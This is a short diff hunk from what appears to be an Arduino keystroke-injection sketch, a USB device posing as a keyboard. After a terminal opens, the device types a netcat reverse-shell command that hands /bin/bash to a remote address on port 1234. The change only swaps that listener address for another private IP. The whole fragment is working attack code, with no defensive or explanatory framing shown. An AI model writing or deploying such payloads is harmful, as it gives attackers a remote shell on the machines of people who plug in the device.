@@ -46,7 +46,7 @@ delay(1000); // Wait for terminal to open
 
 // Reverse shell command using nc
 
-Keyboard.print("nc -e /bin/bash 10.1.75.129 1234");
+Keyboard.print("nc -e /bin/bash 192.168.125.156 1234");
 
 typeKey(KEY_RETURN);
 
